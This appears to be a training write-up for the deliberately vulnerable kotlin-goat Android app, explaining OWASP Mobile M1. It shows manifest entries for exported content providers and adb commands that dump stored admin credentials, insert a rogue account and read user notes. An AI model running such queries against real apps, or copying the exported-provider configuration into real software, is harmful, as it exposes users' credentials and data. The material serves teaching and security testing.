M1: Improper Platform Usage
===========================
From the [Android documentation] [4]: "Content providers are one of the primary building blocks of Android applications, providing content to applications". Content providers are mostly used to share data between Android applications. Such as Activities, Services or Receivers, Content providers can have weak permissions or can be exported for all the apps on the device. Such misconfiguration can lead the Android app to leak the data used by the Content provider.

When the Content provider is exported, all the apps can query the Content provider to retrieve or modify the data. On the kotlin-goat app, we can identify that a Content provider is defined with the name ".AccountProvider" and the exported tag is set to true. Here is an extract of the AndroidManifest file:
```
<provider
            android:name=".AccountProvider"
            android:authorities="com.cx.vulnerablekotlinapp.accounts"
            android:enabled="true"
            android:exported="true" />
```

Looking at the code on the AccountProvider.kt class, we can retrieve the Content URI:
```
companion object {
        private val AUTHORITY = "com.cx.vulnerablekotlinapp.accounts"
        private val ACCOUNTS_TABLE = "Accounts"
        val CONTENT_URI : Uri = Uri.parse("content://" + AUTHORITY + "/" +
                ACCOUNTS_TABLE)
        private val DATABASE_NAME = "data"
    }
```

Then, using the adb tool, we can query this provider and even insert data. Here is simple example allowing to query the provider in order to retrieve the accounts stored:
```
$ adb shell content query --uri content://com.cx.vulnerablekotlinapp.accounts/Accounts
Row: 0 id=1, username=admin, password=admin

```
We can obtain the admin's credentials in this case.


Here is another example allowing to add a new account into the kotlin-goat app:
```
$ adb shell content insert --uri content://com.cx.vulnerablekotlinapp.accounts/Accounts  --bind username:s:kotlin --bind password:s:goat
$ adb shell content query --uri content://com.cx.vulnerablekotlinapp.accounts/Accounts
Row: 0 id=1, username=admin, password=admin
Row: 1 id=2, username=kotlin, password=goat

```

In the same manner, the app leaks a Content provider named ".NotesProvider" for the notes created by the user.
Here is the definition of the Content provider in the Android manifest:
```
<provider
            android:name=".NotesProvider"
            android:authorities="com.cx.vulnerablekotlinapp.notes"
            android:enabled="true"
            android:exported="true"></provider>
```

As shown previously, we can obtain the Content URI by analyzing the NotesProvider class:
```
 companion object {
        private val AUTHORITY = "com.cx.vulnerablekotlinapp.notes"
        private val NOTES_TABLE = "Notes"
        val CONTENT_URI : Uri = Uri.parse("content://" + AUTHORITY + "/" +
                NOTES_TABLE)
        private val DATABASE_NAME = "data"
    }
```

Again, with the adb tool, we can query this provider and retrieve the notes stored:
```
$ adb shell content query --uri content://com.cx.vulnerablekotlinapp.notes/Notes
Row: 0 id=1, title=whvw, content=whvw, createdAt=2019-01-07 14:58:32, owner=1
```

For this provider, we can observe that the notes are not stored in clear text (the title and content of the note should be "test").
This encryption mechanism is further analyzed in the [M5: Insufficient Cryptography][8]

More information about how to test improper platform usage can be found on the [OWASP Mobile Testing Guide][5] and especially on the [Testing Platorm Interaction] [6] section.

## Resources

### Tools

* adb
* [apktool][1]
* [jadx][2]
* [jd-gui][3]

### Readings

* [Android documentation: Content Provider][4]
* [OWASP Mobile Testing Guide][5]
* [Testing Platform Interaction][6]
* [M1: OWASP Mobile Top 10 2016][7]

[1]: https://github.com/skylot/jadx
[2]: http://jd.benow.ca/
[3]: https://ibotpeaches.github.io/Apktool/
[4]: https://developer.android.com/reference/android/content/ContentProvider
[5]: https://www.owasp.org/index.php/OWASP_Mobile_Security_Testing_Guide
[6]: https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05h-Testing-Platform-Interaction.md
[7]: https://www.owasp.org/index.php/Mobile_Top_10_2016-M1-Improper_Platform_Usage
[8]: ../m5-insufficient-cryptography